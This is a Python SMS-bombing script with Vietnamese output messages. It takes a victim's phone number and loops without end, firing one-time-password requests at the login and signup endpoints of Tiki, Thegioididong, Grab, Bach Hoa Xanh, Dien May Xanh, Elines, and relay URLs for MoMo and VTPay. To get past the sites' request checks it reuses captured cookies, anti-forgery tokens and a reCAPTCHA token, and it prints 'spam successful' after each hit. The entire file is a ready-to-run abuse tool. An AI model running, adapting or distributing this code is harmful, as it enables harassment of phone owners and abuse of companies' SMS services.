import requests,os,sys
from time import sleep
os.system("cls" if os.name == "nt" else "clear")
list_phone=[]
phone=input('Nhập sđt: ')
list_phone.append(phone)
def tiki(i,phone):
    try:
        data={"phone_number":phone}
        ti=requests.post('https://tiki.vn/api/v2/customers/otp_codes',headers={'accept': 'application/json, text/plain, */*','accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5','content-length': str(len(data)),'content-type': 'application/json;charset=UTF-8','origin': 'https://tiki.vn','referer': 'https://tiki.vn/','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="102", "Google Chrome";v="102"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': 'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36',},json={"phone_number":phone}).json()
        if 'true' in str(ti):print('Spam Thành Công TIKI =>',i,ti)
    except:pass
def momo(i,phone):
    try:
        mm=requests.get('https://stoolnopro.com/api/momo/index.php?phone='+phone).text
        print('Spam Thành Công MOMO =>',i,mm)
    except:pass
def vtpay(i,phone):
    try:
        vt=requests.get('https://danganhduy.io/login-vtpay.php?phone='+phone).text
        print('Spam Thành Công VTPAY =>',i,phone)
    except:pass
def tgdd(i,phone):
    try:
        data={'phoneNumber': phone,'isReSend': 'false','__RequestVerificationToken': 'CfDJ8ATZIKhAOnlOk2rhIVIlhM5MWfIylT9T34mJGrIgGvd2rGdog7FJcSk7ssv__CjCG2vi4RI1unT42uqjUm6JmFLSfzHoVK9Pj07Q9-WsbmiQS8RN-CZvXobBZfP3N78_BERGbOXVE9KGMN08Qr_QdkY'}
        dd=requests.post('https://www.thegioididong.com/lich-su-mua-hang/Login/GetVerifyCode',headers={'Accept': '*/*','Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5','Connection': 'keep-alive','Content-Length': str(len(data)),'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8','Cookie': 'TBMCookie_3209819802479625248=257483001654510391tEZu9Mo57mnHfd9/KdO68W6bCT4=; ___utmvm=###########; DMX_Personal=%7B%22CustomerId%22%3A0%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22Address%22%3Anull%2C%22CurrentUrl%22%3Anull%2C%22ProvinceId%22%3A3%2C%22ProvinceName%22%3A%22H%E1%BB%93%20Ch%C3%AD%20Minh%22%2C%22DistrictId%22%3A0%2C%22DistrictType%22%3Anull%2C%22DistrictName%22%3Anull%2C%22WardId%22%3A0%2C%22WardType%22%3Anull%2C%22WardName%22%3Anull%2C%22StoreId%22%3A0%7D; _gid=GA1.2.2142725704.1654510350; _fbp=fb.1.1654510350234.532530980; cebs=1; _ce.s=v~0805f607e7acf3a4ffd0d32e1f231d2c229f3d96~vpv~0; lhc_per=vid|41495ef88a41413ea1b3; .AspNetCore.Antiforgery.UMd7_MFqVbs=CfDJ8ATZIKhAOnlOk2rhIVIlhM7olqv2_vSi34Aeo2H1ARYuNem1p1789vha6aaj2gh8z1RJzOZgrNuFmWE2VTleytvFo0twGIM4xG7lonb-NBDw7wBkTPndcpbAExt8wLFH3tkZZH3kyu6dAGMF-u_goT8; _gat=1; _gat_UA-918185-25=1; _ga_TLRZMSX5ME=GS1.1.1654510349.1.1.1654510425.56; _ga=GA1.1.1833878188.1654510350; SvID=beline2683|Yp3Tk|Yp3TP; cebsp=2','Host': 'www.thegioididong.com','Origin': 'https://www.thegioididong.com','Referer': 'https://www.thegioididong.com/lich-su-mua-hang/dang-nhap','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="102", "Google Chrome";v="102"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','Sec-Fetch-Dest': 'empty','Sec-Fetch-Mode': 'cors','Sec-Fetch-Site': 'same-origin','User-Agent': 'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36','X-Requested-With': 'XMLHttpRequest'},data=data).json()
        print('Spam Thành CôngTGDĐ1 =>',i,dd['error'])
    except:pass
    #####
    try:
        data2={'phoneNumer': phone,'isResendOTP': 'true','__RequestVerificationToken': 'MF7S_vQoTHiuscmn_2xaYViLGTwt1MfRNB30f7FNer0Oc8bjmyvWb27oaoLCAhnt4GIZfK9rw5eNvQtrfsXPFr7R6CM1'}
        dd2=requests.post('https://www.thegioididong.com/game-app/aj/Profile/SendVerifyCodeLoginByPhoneNumber',headers={'Accept': '*/*','Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5','Connection': 'keep-alive','Content-Length': str(len(data2)),'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8','Cookie': 'TBMCookie_3209819802479625248=257483001654510391tEZu9Mo57mnHfd9/KdO68W6bCT4=; ___utmvm=###########; DMX_Personal=%7B%22CustomerId%22%3A0%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22Address%22%3Anull%2C%22CurrentUrl%22%3Anull%2C%22ProvinceId%22%3A3%2C%22ProvinceName%22%3A%22H%E1%BB%93%20Ch%C3%AD%20Minh%22%2C%22DistrictId%22%3A0%2C%22DistrictType%22%3Anull%2C%22DistrictName%22%3Anull%2C%22WardId%22%3A0%2C%22WardType%22%3Anull%2C%22WardName%22%3Anull%2C%22StoreId%22%3A0%7D; _gid=GA1.2.2142725704.1654510350; _fbp=fb.1.1654510350234.532530980; cebs=1; _ce.s=v~0805f607e7acf3a4ffd0d32e1f231d2c229f3d96~vpv~0; lhc_per=vid|41495ef88a41413ea1b3; .AspNetCore.Antiforgery.UMd7_MFqVbs=CfDJ8ATZIKhAOnlOk2rhIVIlhM7olqv2_vSi34Aeo2H1ARYuNem1p1789vha6aaj2gh8z1RJzOZgrNuFmWE2VTleytvFo0twGIM4xG7lonb-NBDw7wBkTPndcpbAExt8wLFH3tkZZH3kyu6dAGMF-u_goT8; MWG_ORDERHISTORY_SS=CfDJ8ATZIKhAOnlOk2rhIVIlhM5kANqQ8BxDTom8NqgYn1kTBESsk%2FhsikEU%2BzraqALtOar9GJ29W4U6vLiZJLEKPkpjCj%2FkgG3T5qIgYw2knXG31pVjdLtXST4XVbOPElLWkou5GnMMypdX1hrXA8%2FRzDMNu50e6OMY6Q2ypAGHU6js; __RequestVerificationToken_L2dhbWUtYXBw0=ly_XE4br_ZUwilZ5gyiDlOjMCrJ83Z6aPiO2lQZMCt5dcxdgVNYpr1VxE3yds9GgcWr2JG8cgsfO-ysyP305MAW6tJw1; chat.info=; chat.username=20220501Sn198X3cYRmv9ntvADoo; chat.chating=; chat.notifychatmsg=; _ga=GA1.1.1833878188.1654510350; cebsp=5; _ga_TLRZMSX5ME=GS1.1.1654510349.1.1.1654511614.51; ASP.NET_SessionId=b1krpfzg23100zmovwazgbw0; SvID=tt615|Yp3YO|Yp3TP','Host': 'www.thegioididong.com','Origin': 'https://www.thegioididong.com','Referer': 'https://www.thegioididong.com/game-app','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="102", "Google Chrome";v="102"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','Sec-Fetch-Dest': 'empty','Sec-Fetch-Mode': 'cors','Sec-Fetch-Site': 'same-origin','User-Agent': 'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36','X-Requested-With': 'XMLHttpRequest'},data=data2).json()
        print('Spam Thành CôngTGDĐ2 =>',i,dd2['error'])
    except:pass
def grab(i,phone):
    try:
        json={"client_id":"4ddf78ade8324462988fec5bfc5874c2","ctx_id":"c6522e925f2f4103bc7e1e57f1f5c769","country_code":"VN","method":"SMS","num_digits":6,"scope":"openid profile.read foodweb.order foodweb.rewards foodweb.get_enterprise_profile","phone_number":f"84{phone}"}
        h={'Accept': 'application/json, text/plain, */*','Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5','Connection': 'keep-alive','Content-Length': str(len(json)),'Content-Type': 'application/json','Cookie': 'utm_source=Google; utm_medium=non-paid; _gid=GA1.2.245624710.1654581920; _gcl_au=1.1.612621744.1654581921; __antscv_utm=%7B%22channel%22%3A%22google.com%22%2C%22utm_source%22%3A%22google.com%22%2C%22type%22%3A2%7D; ants_ad_ss=f4c4f00d5971ec601cb133d5570da34d5496ae62; _atrk_siteuid=XU0lTkSBimtaGeIG; _atrk_ssid=nCls6llASkMHYyA-cQJoJ2; appier_page_isView_0c798181a14efc5=829e7893cc80ca42a28c40645427fb6a9fd8ddf0b8ec6d76d12087db193b7377; appier_pv_counter701ec4bbafbcfc5=0; appier_page_isView_701ec4bbafbcfc5=829e7893cc80ca42a28c40645427fb6a9fd8ddf0b8ec6d76d12087db193b7377; _fbp=fb.1.1654581922210.230747937; _hjFirstSeen=1; _hjSession_1532049=eyJpZCI6IjI2MjU5MzhmLTVlNWYtNDYyMy1iMWRiLTcyNjUwMGE1ZTViNiIsImNyZWF0ZWQiOjE2NTQ1ODE5MjI0MTYsImluU2FtcGxlIjp0cnVlfQ==; _hjAbsoluteSessionInProgress=0; appier_utmz=%7B%22csr%22%3A%22google%22%2C%22timestamp%22%3A1654581922%2C%22lcsr%22%3A%22google%22%7D; _atrk_sessidx=2; appier_pv_counter0c798181a14efc5=1; _hjSessionUser_1532049=eyJpZCI6IjYxMDQxY2I5LTRhYjMtNTRmZi1hMTE0LWVhNTk0NTU5ZDkzYyIsImNyZWF0ZWQiOjE2NTQ1ODE5MjE5NzUsImV4aXN0aW5nIjp0cnVlfQ==; _ga_65FYNH52KQ=GS1.1.1654581921.1.1.1654581951.30; _gat_UA-73060858-24=1; _ga=GA1.2.1660163821.1654581920; _ga_RPEHNJMMEM=GS1.1.1654581955.1.0.1654581958.57; _gat_UA-73060858-15=1','Host': 'partner-api.grab.com','Origin': 'https://weblogin.grab.com','Referer': 'https://weblogin.grab.com/','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="102", "Google Chrome";v="102"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','Sec-Fetch-Dest': 'empty','Sec-Fetch-Mode': 'cors','Sec-Fetch-Site': 'same-site','User-Agent': 'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36','X-Recaptcha': '03AGdBq24kZXDmnGnB0hJvwTHHPu6EnthzsoYYzazwOl6Tv0ySsYsAhhJExs3OPSR9mJ7yvBM3BlE8W2m8zse9A4OsCa8y7dspi-RL6inW3mXrLsWpHWavrstIN81B_CV80LT1zxoXBiEk3tgMfxbm1P7dTTqJDZ-2E9OnOj1Ce3cGhX7Op2U2HHJda3jzoVY7oZNsv53_VWWX-KA7uobs6EK82Pqt8NJFJsDLX1kxlEvqDJIn0dP3uYwyAPvgZNulQdiojF69eKhF3FB4EyT3p7oPg29nzZL3y3wwGCiJRfalJ1ILrcdhExln1l-JyTiBDJvpDoYLv9XHV9akleB025vJV5l4MlNgF78KP-Ry9yikp_a-7D06Y28xDwGv8FWGRwZPug_mRedvsH4fy6ezg-OJzuCxmvqTvryw5r4ZL6iWnzm0wBLJiH1nZND27I2ob_RUFPBGVejS-hjlNzF8jSanmpJuQIhteMdcVkpkA7L_UzwozCP95TMRI2bt8aUQFKP2nkatIz4_5D76NnTh_UAltP1TilAcEAWXwcCZgL6S7o09TcTDHa0S1tBH_CN8W_z_fqRvONPGycY4CgesdZAhezR-IwJyawcrReaynTB9V3fjd4wVolNlbvf1kLuE3vFNSJzC3grtp_ja3GHk294ywQ-MMZdzy-eWfQdKP1M_TJi1cS7TLnE3m8699pbdcIqlm2pQApSwjRRyKRwvwYC3tQZ5Jxd5BIdQ8IRx-5gQQ6nkNySprxShtHAOE5yDHyr2vnwflZc9kaZFz_125NC-OD_FBXAe9d2g-VG_ilBk-BrM0wcSLs_w0F1HrLAwX-GKUgrIvDpmNg71Uh1eb8Ek8Dn8iDA1TrQNF9ol6kKisdXN4Z9FKcHduFRvqS9SkkVUJD1WdxFfPYqqlpzZ9p1a02s1WJlZoWIYb3ZEhQ0XmeF9Imjs370D6b4rnOiZAzUSia07SVTu3m1HrCoXQAgIgXiJ_h8UZXvE-ppIrzvacnP3eG7gOuqvPjE9ep77UF9Qq_NhWXKuR-mM-as0eFKoQGRwBLWUo-8oIdu5T11NBXJ6DgtwREykheIFRjbL0XjxajpFvzkw1dLBzl7-fRetiaZiXcGZ0CDt9dE6lV7WicDX3v42F4QH7dBFkl1Mbxl99e8z5LCaQOP5SLK2uYVyzpjmcIojBku8LMsQhgsEhnZOZt8aA8OUNVE1_14zT6nqMBQuAY8ysJCerMsCEHvSffbsgfT04U-hPKrcVhcZRdM7Wk4IKJDhjhDno2zgBRrpS4HtaiL1IyuwomS4tNnFlH-bCDRJRwKwDULEhDmBQYGRkPiaQik','X-Request-ID': 'a8872813-7996-49a1-abda-18fca3565f86'}
        grb=requests.post('https://partner-api.grab.com/grabid/v1/oauth2/otp',headers=h,json=json).json()
        print('Spam Thành Công GRAB FOOD =>',i,grb)
    except:pass
def bach_hoa_xanh(i,phone):
    try:
        data={'phone': phone,'objectId': 'a2a9cf21-fd74-424d-b42a-cd696cb405f0','type': '4'}
        bhx=requests.post('https://www.bachhoaxanh.com/aj/Customer/SendOTP',headers={'Accept': 'application/json, text/javascript, */*; q=0.01','Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5','Connection': 'keep-alive','Content-Length': str(len(data)),'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8','Cookie': 'TBMCookie_3209819802479625248=462288001654582548aP9erQjHArsbnke1sG9C2+JcyzU=; ___utmvm=###########; ASP.NET_SessionId=vjn3f3mw20nsyqab3rckzcqm; trackSSID=db9a955450517d1b2f81c3b4398e119a; lhc_per=vid|338559d00f0354180a7b; bhx_vcrif={%22Email%22:null%2C%22NameWithGender%22:%22b%E1%BA%A1n%22%2C%22Name%22:null%2C%22Gender%22:-1%2C%22Phone%22:%22%22%2C%22me%22:%22LLw/ckoZPTE=%22}; bhxcid=204d0054-965d-4154-b540-6568d9a26cf2; _gcl_au=1.1.748512260.1654582556; _ga=GA1.2.340455592.1654582556; _gid=GA1.2.1748971856.1654582556; _gat_UA-68702031-1=1; _fbp=fb.1.1654582556207.266857399; cebs=1; __RequestVerificationToken=ZrT89_sr00kS1a7ovjb64yyAj1QffDIkEyFd_qYocqse_d253MiRHTvobJjs2YEJtTId-nzXR7bmYOjuarjg1_EBioEs-9F5BP-OHOehCX81; cebsp=1; _ce.s=v~0b642878d5895a0023bca213afe383978e5fd8d1~vpv~0~v11.rlc~1654582564876; SvID=bhx26175|Yp7tL|Yp7tF','Host': 'www.bachhoaxanh.com','Origin': 'https://www.bachhoaxanh.com','Referer': 'https://www.bachhoaxanh.com/dang-nhap?callback=%2Flich-su-mua-hang','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="102", "Google Chrome";v="102"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','Sec-Fetch-Dest': 'empty','Sec-Fetch-Mode': 'cors','Sec-Fetch-Site': 'same-origin','User-Agent': 'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36','X-Requested-With': 'XMLHttpRequest'},data=data).json()
        print('Spam Thành Công BACH HOA XANH =>',i,bhx)
    except:pass
def dien_may_xanh(i,phone):
    try:
        data={'phoneNumber': phone,'isReSend': 'true','__RequestVerificationToken': 'CfDJ8ATZIKhAOnlOk2rhIVIlhM48w_yz-6bF9hXgZtq25uEw7lSI1UaQXREz_Ya9DeeQdj3eBkrag7uGMEeVIgagGIzo-NsvHcbeSQJRqIQIkZqfGrOa6tIBTbViE4086SMRV8n0f05OQQME2xiSRxlved0'}
        dmx=requests.post('https://www.dienmayxanh.com/lich-su-mua-hang/Login/GetVerifyCode',headers={'Accept': '*/*','Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5','Connection': 'keep-alive','Content-Length': str(len(data)),'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8','Cookie': 'TBMCookie_3209819802479625248=952511001654583156+Kq58c0JL71VNY4qIA+b6twKrnA=; ___utmvm=###########; DMX_Personal=%7B%22CustomerId%22%3A0%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22Address%22%3Anull%2C%22CurrentUrl%22%3Anull%2C%22ProvinceId%22%3A3%2C%22ProvinceName%22%3A%22H%E1%BB%93%20Ch%C3%AD%20Minh%22%2C%22DistrictId%22%3A0%2C%22DistrictType%22%3Anull%2C%22DistrictName%22%3Anull%2C%22WardId%22%3A0%2C%22WardType%22%3Anull%2C%22WardName%22%3Anull%2C%22StoreId%22%3A0%7D; _gcl_au=1.1.1295894269.1654583162; _gid=GA1.2.1063557601.1654583163; .AspNetCore.Antiforgery.UMd7_MFqVbs=CfDJ8ATZIKhAOnlOk2rhIVIlhM43rYtczsROjmwnO6XQ5ImffgeKwk5evQ4X6icPEgdcFuXdv_hs7rTtsxVY8-EdABP-9UMQFuuQBTRvz4S2ZJK6I6wovdiv_61CSKXpdW0nlcCQS5v0TmqdiFEM4gbH-nI; _ga=GA1.1.601716618.1654583163; cebs=1; _ce.s=v~c2e936833da79c01e9a67ef4f6f53f7c0d62a084~vpv~0; _fbp=fb.1.1654583166255.415003383; cebsp=1; _hjSessionUser_46615=eyJpZCI6Ijc4NzNkMDBlLTA1NDItNWNkZi1iYjk0LWYxZmQwMzMyNjU2NCIsImNyZWF0ZWQiOjE2NTQ1ODMxNjYyOTgsImV4aXN0aW5nIjpmYWxzZX0=; _hjFirstSeen=1; _hjSession_46615=eyJpZCI6IjMzZGUxYmQ3LWY2MmEtNGI0YS04ODk5LWUyNmYzZTVlZThiNyIsImNyZWF0ZWQiOjE2NTQ1ODMxNjc5NDYsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=0; lhc_per=vid|b7525bc59cdbf4393f5e; MWG_ORDERHISTORY_SS=CfDJ8ATZIKhAOnlOk2rhIVIlhM4Zgk6ubxEBn5Ws%2FQ4qK1YwFTrNYJv27nzLUaqzfKWMRD3iJNwZr8x%2FlI4sxOSqKvV3Knwzvb%2FtFEoVJFxjBU5BGG%2B9dw7sRVSjY9SDs74jjb1MP8OyHrIWiUaX%2BVdmKvnnaIu7Ix5WavM%2B73Zd%2BLjN; SvID=new2693|Yp7vi|Yp7vd; _ga_Y7SWKJEHCE=GS1.1.1654583162.1.1.1654584891.60','Host': 'www.dienmayxanh.com','Origin': 'https://www.dienmayxanh.com','Referer': 'https://www.dienmayxanh.com/lich-su-mua-hang/dang-nhap','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="102", "Google Chrome";v="102"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','Sec-Fetch-Dest': 'empty','Sec-Fetch-Mode': 'cors','Sec-Fetch-Site': 'same-origin','User-Agent': 'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36','X-Requested-With': 'XMLHttpRequest'},data=data).json()
        print('Spam Thành Công DIEN MAY XANH =>',i,dmx)
    except:pass
def elines(i,phone):
    try:
        json={"phone":phone,"type":"sign_up"}
        el=requests.post('https://www.elines.vn/api2/core/sendOTP',headers={'accept': '*/*','accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5','content-length': str(len(json)),'content-type': 'application/json','cookie': '_gcl_aw=GCL.1654609395.CjwKCAjw7vuUBhBUEiwAEdu2pLWq970FJT77fgpCTaGocfsQNTTknhfhNm3R8zrNAnCPC01vq-aAKxoCSO4QAvD_BwE; _gcl_au=1.1.1568085477.1654609395; __zi=3000.SSZzejyD7T8YXFszc1KMWo3Gu_EM3LNVCjhyuTGVGyazXFNaa5T7pJs6zgsOLqQ2EOJtfvbMHuiv.1; _ga=GA1.2.1116262771.1654609395; _gid=GA1.2.657006113.1654609395; _gac_UA-224922209-1=1.1654609395.CjwKCAjw7vuUBhBUEiwAEdu2pLWq970FJT77fgpCTaGocfsQNTTknhfhNm3R8zrNAnCPC01vq-aAKxoCSO4QAvD_BwE; _gat_UA-224922209-1=1; _fbp=fb.1.1654609395645.832381763','origin': 'https://www.elines.vn','referer': 'https://www.elines.vn/account/register','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="102", "Google Chrome";v="102"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': 'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36'},json=json).json()
        print('Spam Thành Công ELINES =>',i,el)
    except:pass
i=0
while(True):
    for phone in list_phone:
        i=i+1
        tiki(i,phone)
        i=i+1
        momo(i,phone)
        i=i+1;sleep(3)
        vtpay(i,phone)
        i=i+1;sleep(3)
        tgdd(i,phone)
        i=i+1;sleep(3)
        grab(i,phone)
        i=i+1;sleep(3)
        bach_hoa_xanh(i,phone)
        i=i+1;sleep(3)
        dien_may_xanh(i,phone)
        i=i+1;sleep(3)
        elines(i,phone)
        i=i+1;sleep(3)